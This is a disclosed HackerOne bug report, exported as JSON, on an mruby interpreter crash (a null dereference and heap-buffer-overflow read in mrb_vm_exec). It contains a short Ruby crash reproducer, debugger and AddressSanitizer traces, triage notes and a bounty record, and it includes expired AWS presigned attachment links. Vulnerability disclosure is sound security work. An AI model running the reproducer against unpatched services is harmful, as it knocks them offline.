{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "eveeez", 
        "mpz", 
        "apapedulimu", 
        "spetr0x", 
        "amjamjamj", 
        "jeffakiller123"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "800.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 197693, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-02-07T01:23:52.096Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "SIGSEGV - mrb_vm_exec - line:1681", 
    "is_member_of_team?": null, 
    "vote_count": 6, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-03-09T01:23:52.130Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$800", 
    "attachments": [
        {
            "file_name": "test_mrb_vm_exec_1681.rb", 
            "type": "text/plain", 
            "id": 151692, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/151/692/02a530f1d563feb523da32c680c757aa3ff5d808/test_mrb_vm_exec_1681.rb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3XJAUJU3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224229Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDFhsOVc%2BLBuZJpN2%2FSK3A3ZSLRshQ37cr%2FnNfrsDZBl9Q9MwEJMM1w9f3SvUV6XmoP9nE3PeRToIYvFP152VEnHi03BXq%2BWX7mrp9duCLiSGu%2BuVj85dqXhL9hy5iZ8Baa9Dz1PfTpOuhKCmbaYzCWIDNTGGHjLe%2FHfj5BNMi3SKneAl%2FX0h%2BZqSIdJKDz1SK5Y92eHwZBEL8GznF9GsT%2Fe6zDxKRumhz8Vkk3IGYi5pwUBa6qmtuvb0%2FFBueYSgxUsIbsmK0uIt1sxLJbfLOybgHUA18Z80yVa0KlQc%2BgoSsS484NaEhLTbRqdlZ%2BxywVi8oiNq8ePPGFix9FXwU3HcD5DsyS3oPWa%2BzB9%2FB%2Fj5i%2F%2B%2Fdj%2Fww%2BhTYa6J%2BrE25cJz8f7DhYt5rCg9X8q2TCUwBOYuOUl5A0l4eFCWneCTq2xxhRjl1g1J%2BaAUAShH%2BiAD7%2BKi%2B3APDa6E97UEIGwiReOW1M7p2dsYu%2BTRFAcWFkx%2FfdNcmK%2F1EAANP1i4cT%2FBf2l24Vc5LPZJjCm1RkrTRxc90qzl8fyslqz595eagGsI73K0uzaibH5HvlrUQwLfX4TmlW%2Foze1zEhFUOiAB5qs%2FM3wow8am4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0417758a25d0c14ad5d667544435733762964eea1a37890f5abea7d10703a4c6"
        }, 
        {
            "file_name": "sandbox.log", 
            "type": "text/plain", 
            "id": 151693, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/151/693/ae58e575d95f78b71fa94f86c5d107582af51589/sandbox.log?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3XJAUJU3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224229Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEBAaDFhsOVc%2BLBuZJpN2%2FSK3A3ZSLRshQ37cr%2FnNfrsDZBl9Q9MwEJMM1w9f3SvUV6XmoP9nE3PeRToIYvFP152VEnHi03BXq%2BWX7mrp9duCLiSGu%2BuVj85dqXhL9hy5iZ8Baa9Dz1PfTpOuhKCmbaYzCWIDNTGGHjLe%2FHfj5BNMi3SKneAl%2FX0h%2BZqSIdJKDz1SK5Y92eHwZBEL8GznF9GsT%2Fe6zDxKRumhz8Vkk3IGYi5pwUBa6qmtuvb0%2FFBueYSgxUsIbsmK0uIt1sxLJbfLOybgHUA18Z80yVa0KlQc%2BgoSsS484NaEhLTbRqdlZ%2BxywVi8oiNq8ePPGFix9FXwU3HcD5DsyS3oPWa%2BzB9%2FB%2Fj5i%2F%2B%2Fdj%2Fww%2BhTYa6J%2BrE25cJz8f7DhYt5rCg9X8q2TCUwBOYuOUl5A0l4eFCWneCTq2xxhRjl1g1J%2BaAUAShH%2BiAD7%2BKi%2B3APDa6E97UEIGwiReOW1M7p2dsYu%2BTRFAcWFkx%2FfdNcmK%2F1EAANP1i4cT%2FBf2l24Vc5LPZJjCm1RkrTRxc90qzl8fyslqz595eagGsI73K0uzaibH5HvlrUQwLfX4TmlW%2Foze1zEhFUOiAB5qs%2FM3wow8am4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=37e353621577b643d0fc466f69c1c123ed6043c8a619411c5768ed7cf447cb3b"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": true, 
            "created_at": "2017-01-12T00:50:11.935Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-12T00:50:11.935Z", 
            "actor": {
                "url": "/shopify-scripts", 
                "profile": {
                    "name": "shopify-scripts"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
                }
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!", 
            "markdown_message": "<p>Thank you for reporting this bug! This is an automated response to let you know that we&#39;ve received your issue, and we&#39;ll process it as soon as possible.</p>\n\n<p>Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1415112, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-01-21T21:58:58.773Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-21T21:58:58.773Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thank you for your report. We've reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3406", 
            "markdown_message": "<p>Thank you for your report. We&#39;ve reproduced the crash and opened an issue upstream: <a title=\"https://github.com/mruby/mruby/issues/3406\" href=\"/redirect?signature=0f5f26acfc17e23e1b884f20a829d7be8a6f5e7d&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3406\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/issues/3406</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1435097, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ston3", 
                "url": "/ston3"
            }, 
            "created_at": "2017-01-23T16:40:48.376Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-01-23T16:40:48.376Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thanks again for your report. This issue has been addressed upstream in https://github.com/mruby/mruby/commit/ffb5e5ab08624c899de03b5347966eb3e070dce5.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.", 
            "markdown_message": "<p>Thanks again for your report. This issue has been addressed upstream in <a title=\"https://github.com/mruby/mruby/commit/ffb5e5ab08624c899de03b5347966eb3e070dce5\" href=\"/redirect?signature=2e185dd97a7cf7968cd5649338b1cc27e83a1256&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Fffb5e5ab08624c899de03b5347966eb3e070dce5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/ffb5e5ab08624c899de03b5347966eb3e070dce5</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>Our next round of bounty decisions will take place within two weeks, so we&#39;ll be in touch with you again soon.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1438611, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-02-07T01:23:45.737Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-07T01:23:45.737Z", 
            "actor": {
                "url": "/shopify-scripts", 
                "profile": {
                    "name": "shopify-scripts"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
                }
            }, 
            "team_handle": "shopify-scripts", 
            "bonus_amount": "0.0", 
            "bounty_amount": "800.0", 
            "collaborator": {
                "username": "ston3", 
                "url": "/ston3"
            }, 
            "message": "Thanks for helping improve the security of Mruby and Shopify Scripts!", 
            "markdown_message": "<p>Thanks for helping improve the security of Mruby and Shopify Scripts!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1467329, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-07T01:23:52.113Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-07T01:23:52.113Z", 
            "actor": {
                "username": "andrewdunbar", 
                "url": "/andrewdunbar", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1467332, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-02-07T08:52:17.966Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-02-07T08:52:17.966Z", 
            "actor": {
                "username": "ston3", 
                "url": "/ston3", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify-scripts", 
            "message": "Thanks for bounty.", 
            "markdown_message": "<p>Thanks for bounty.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1467908, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-03-09T01:24:07.587Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-03-09T01:24:07.587Z", 
            "actor": {
                "url": "/shopify-scripts", 
                "profile": {
                    "name": "shopify-scripts"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
                }
            }, 
            "team_handle": "shopify-scripts", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1528901, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "ston3", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ston3", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 48, 
        "name": "Denial of Service"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -55113517.43355732, 
    "disclosed_at": "2017-03-09T01:24:07.567Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/197693", 
    "created_at": "2017-01-12T00:50:11.708Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"poc\">PoC:</h2>\n\n<p>The following code triggers the bug (attached as test_mrb_vm_exec_1681.rb):</p>\n<pre class=\"highlight plaintext\"><code>def try\nyield\nensure\nyield end\na=lambda do \n  a.try do\nreturn end end.call\n</code></pre>\n<h2 id=\"mirb-debug\">Mirb - Debug:</h2>\n<pre class=\"highlight plaintext\"><code>(gdb) r test_mrb_vm_exec_1678.rb \nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/x/Desktop/research/test_2/mruby/bin/mirb test_mrb_vm_exec_1678.rb\nmirb - Embeddable Interactive Ruby Shell\n\n =&gt; :try\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000004291ef in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71b2d0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681\n1681            irep = proc-&gt;body.irep;\n(gdb) info reg\nrax            0x0  0\nrbx            0x6b9520 7050528\nrcx            0x722990 7481744\nrdx            0x6bfe20 7077408\nrsi            0x6b4710 7030544\nrdi            0x6ad010 7000080\nrbp            0x7fffffffca40   0x7fffffffca40\nrsp            0x7fffffffc4c0   0x7fffffffc4c0\nr8             0x0  0\nr9             0x7ffff7acd7b8   140737348687800\nr10            0x7ffff784ff40   140737346076480\nr11            0x7ffff7895701   140737346361089\nr12            0x401ca0 4201632\nr13            0x7fffffffe040   140737488347200\nr14            0x0  0\nr15            0x0  0\nrip            0x4291ef 0x4291ef &lt;mrb_vm_exec+15826&gt;\neflags         0x10217  [ CF PF AF IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) l\n1676              return v;\n1677            }\n1678            pc = ci-&gt;pc;\n1679            DEBUG(printf(&quot;from :%s\\n&quot;, mrb_sym2name(mrb, ci-&gt;mid)));\n1680            proc = mrb-&gt;c-&gt;ci-&gt;proc;\n1681            irep = proc-&gt;body.irep;\n1682            pool = irep-&gt;pool;\n1683            syms = irep-&gt;syms;\n1684    \n1685            regs[acc] = v;\n</code></pre>\n<h2 id=\"backtrace\">Backtrace:</h2>\n<pre class=\"highlight plaintext\"><code>(gdb) bt\n#0  0x00000000004291ef in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71b2d0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681\n#1  0x000000000042541b in mrb_vm_run (mrb=0x6ad010, proc=0x6b0150, self=..., stack_keep=1) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n#2  0x0000000000402b90 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n</code></pre>\n<h2 id=\"clang-mirb\">Clang - mirb</h2>\n<pre class=\"highlight plaintext\"><code>x@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mirb test_mrb_vm_exec_1681.rb \nmirb - Embeddable Interactive Ruby Shell\n\n =&gt; :try\n=================================================================\n==2436==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61e00000f050 at pc 0x0000005ea33f bp 0x7fffe44295f0 sp 0x7fffe44295e8\nREAD of size 4 at 0x61e00000f050 thread T0\n    #0 0x5ea33e in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1663:38\n    #1 0x5d2fbb in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n    #2 0x4f3ee8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n    #3 0x7fe077a43ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #4 0x41a585 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a585)\n</code></pre>\n<h2 id=\"mruby-debug\">Mruby - Debug:</h2>\n<pre class=\"highlight plaintext\"><code>x@x:~/Desktop/research/test_2/mruby/bin$ gdb -q ./mruby\nReading symbols from ./mruby...done.\n(gdb) r test_mrb_vm_exec_1678.rb \nStarting program: /home/x/Desktop/research/test_2/mruby/bin/mruby test_mrb_vm_exec_1678.rb\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000042707c in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71520c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681\n1681            irep = proc-&gt;body.irep;\n(gdb) info reg\nrax            0x0  0\nrbx            0x6b9520 7050528\nrcx            0x70d380 7394176\nrdx            0x6bfe20 7077408\nrsi            0x6b4710 7030544\nrdi            0x6ad010 7000080\nrbp            0x7fffffffdb70   0x7fffffffdb70\nrsp            0x7fffffffd5f0   0x7fffffffd5f0\nr8             0x0  0\nr9             0x7ffff7acd7b8   140737348687800\nr10            0x7ffff7acd7b8   140737348687800\nr11            0x7ffff7895701   140737346361089\nr12            0x401b20 4201248\nr13            0x7fffffffe040   140737488347200\nr14            0x0  0\nr15            0x0  0\nrip            0x42707c 0x42707c &lt;mrb_vm_exec+15826&gt;\neflags         0x10217  [ CF PF AF IF RF ]\ncs             0x33 51\nss             0x2b 43\nds             0x0  0\nes             0x0  0\nfs             0x0  0\ngs             0x0  0\n(gdb) l\n1676              return v;\n1677            }\n1678            pc = ci-&gt;pc;\n1679            DEBUG(printf(&quot;from :%s\\n&quot;, mrb_sym2name(mrb, ci-&gt;mid)));\n1680            proc = mrb-&gt;c-&gt;ci-&gt;proc;\n1681            irep = proc-&gt;body.irep;\n1682            pool = irep-&gt;pool;\n1683            syms = irep-&gt;syms;\n1684    \n1685            regs[acc] = v;\n</code></pre>\n<h2 id=\"backtrace\">Backtrace:</h2>\n<pre class=\"highlight plaintext\"><code>(gdb) bt\n#0  0x000000000042707c in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71520c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681\n#1  0x00000000004232a8 in mrb_vm_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n#2  0x000000000042b2bc in mrb_top_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:2490\n#3  0x0000000000445cca in mrb_load_exec (mrb=0x6ad010, p=0x709480, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#4  0x0000000000445d60 in mrb_load_file_cxt (mrb=0x6ad010, f=0x709080, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#5  0x00000000004024f8 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n</code></pre>\n<h2 id=\"clang-mruby\">Clang - mruby</h2>\n<pre class=\"highlight plaintext\"><code>x@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mruby test_mrb_vm_exec_1681.rb \n=================================================================\n==2434==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61e00000f050 at pc 0x0000005e3e0f bp 0x7fff596043b0 sp 0x7fff596043a8\nREAD of size 4 at 0x61e00000f050 thread T0\n    #0 0x5e3e0e in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1663:38\n    #1 0x5cca8b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n    #2 0x5ffa48 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2490:12\n    #3 0x66fe49 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7\n    #4 0x670965 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10\n    #5 0x4f3ad5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n    #6 0x7f3c733e1ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #7 0x41a4e5 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a4e5)\n</code></pre>\n<h2 id=\"sandbox\">Sandbox</h2>\n\n<p>Attached as sandbox.log.</p>\n<pre class=\"highlight plaintext\"><code>x@x:~/Desktop/research/test_2/mruby-engine/bin$ ./sandbox test_mrb_vm_exec_1678.rb \n./sandbox:20: [BUG] Segmentation fault at 0x00000000000018\nruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0186 s:0005 E:0002b8 EVAL   ./sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:0000a0 TOP    [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n./sandbox:20:in `&lt;main&gt;&#39;\n./sandbox:20:in `sandbox_eval&#39;\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f35da30b310 RBP: 0x00007f35d8e84f80 RSP: 0x00007f35d8e709e0\n RAX: 0x00007f35d8e84b20 RBX: 0x0000000000000000 RCX: 0x0000000000000000\n RDX: 0x0000000000000002 RDI: 0x00007f35d8e724e0 RSI: 0x00007f35d8ed1bac\n  R8: 0x00007f35d8e84b20  R9: 0x0000000000000002 R10: 0x0000000000000074\n R11: 0x0000000000000000 R12: 0x0000000000000000 R13: 0x00007f35d8e724e0\n R14: 0x0000000000000000 R15: 0x0000000000000000 EFL: 0x0000000000010217\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de9eed55]\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de9eef8c]\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de8cb06b]\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f35de98114e]\n/lib/x86_64-linux-gnu/libc.so.6 [0x7f35de4cbff0]\n/home/x/Desktop/research/test_2/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0xae0) [0x7f35da30b310] /home/x/Desktop/research/test_2/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1680\n/home/x/Desktop/research/test_2/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x5c) [0x7f35da3112ec] /home/x/Desktop/research/test_2/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772\n/home/x/Desktop/research/test_2/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0xbe) [0x7f35da2e4f0e] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0(start_thread+0xc2) [0x7f35de27f182] pthread_create.c:312\n/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f35de59030d] ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n...\n...\n...\n7f35deefc000-7f35deefd000 rw-p 00023000 08:01 397412                     /lib/x86_64-linux-gnu/ld-2.19.so\n7f35deefd000-7f35deefe000 rw-p 00000000 00:00 0 \n7fffc731d000-7fffc7b1c000 rw-p 00000000 00:00 0                          [stack]\n7fffc7bfe000-7fffc7c00000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\nAborted (core dumped)\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n\n<p>As far as I can see, it is not exploitable. But it can cause DoS.</p>\n", 
    "vulnerability_information": "PoC:\n-------------------\n\nThe following code triggers the bug (attached as test_mrb_vm_exec_1681.rb):\n\n\tdef try\n\tyield\n\tensure\n\tyield end\n\ta=lambda do \n\t  a.try do\n\treturn end end.call\n\nMirb - Debug:\n-------------------\n\n\t(gdb) r test_mrb_vm_exec_1678.rb \n\tThe program being debugged has been started already.\n\tStart it from the beginning? (y or n) y\n\tStarting program: /home/x/Desktop/research/test_2/mruby/bin/mirb test_mrb_vm_exec_1678.rb\n\tmirb - Embeddable Interactive Ruby Shell\n\n\t => :try\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t0x00000000004291ef in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71b2d0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681\n\t1681\t        irep = proc->body.irep;\n\t(gdb) info reg\n\trax            0x0\t0\n\trbx            0x6b9520\t7050528\n\trcx            0x722990\t7481744\n\trdx            0x6bfe20\t7077408\n\trsi            0x6b4710\t7030544\n\trdi            0x6ad010\t7000080\n\trbp            0x7fffffffca40\t0x7fffffffca40\n\trsp            0x7fffffffc4c0\t0x7fffffffc4c0\n\tr8             0x0\t0\n\tr9             0x7ffff7acd7b8\t140737348687800\n\tr10            0x7ffff784ff40\t140737346076480\n\tr11            0x7ffff7895701\t140737346361089\n\tr12            0x401ca0\t4201632\n\tr13            0x7fffffffe040\t140737488347200\n\tr14            0x0\t0\n\tr15            0x0\t0\n\trip            0x4291ef\t0x4291ef <mrb_vm_exec+15826>\n\teflags         0x10217\t[ CF PF AF IF RF ]\n\tcs             0x33\t51\n\tss             0x2b\t43\n\tds             0x0\t0\n\tes             0x0\t0\n\tfs             0x0\t0\n\tgs             0x0\t0\n\t(gdb) l\n\t1676\t          return v;\n\t1677\t        }\n\t1678\t        pc = ci->pc;\n\t1679\t        DEBUG(printf(\"from :%s\\n\", mrb_sym2name(mrb, ci->mid)));\n\t1680\t        proc = mrb->c->ci->proc;\n\t1681\t        irep = proc->body.irep;\n\t1682\t        pool = irep->pool;\n\t1683\t        syms = irep->syms;\n\t1684\t\n\t1685\t        regs[acc] = v;\n\t\nBacktrace:\n-------------------\n\n\t(gdb) bt\n\t#0  0x00000000004291ef in mrb_vm_exec (mrb=0x6ad010, proc=0x0, pc=0x71b2d0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1681\n\t#1  0x000000000042541b in mrb_vm_run (mrb=0x6ad010, proc=0x6b0150, self=..., stack_keep=1) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772\n\t#2  0x0000000000402b90 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n\t\nClang - mirb\n-------------------\n\n\tx@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mirb test_mrb_vm_exec_1681.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t => :try\n\t=================================================================\n\t==2436==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61e00000f050 at pc 0x0000005ea33f bp 0x7fffe44295f0 sp 0x7fffe44295e8\n\tREAD of size 4 at 0x61e00000f050 thread T0\n\t\t#0 0x5ea33e in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1663:38\n\t\t#1 0x5d2fbb in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n\t\t#2 0x4f3ee8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n\t\t#3 0x7fe077a43ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#4 0x41a585 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a585)\n\nMruby - Debug:\n-------------------\n\t\n\tx@x:~/Desktop/research/test_2/mruby/bin$ gdb -q ./mruby\n\tReading symbols from ./mruby...done.\n\t(gdb) r test_mrb_vm_exec_1678.rb \n\tStarting program: /home/x/Desktop/research/test_2/mruby/bin/mruby 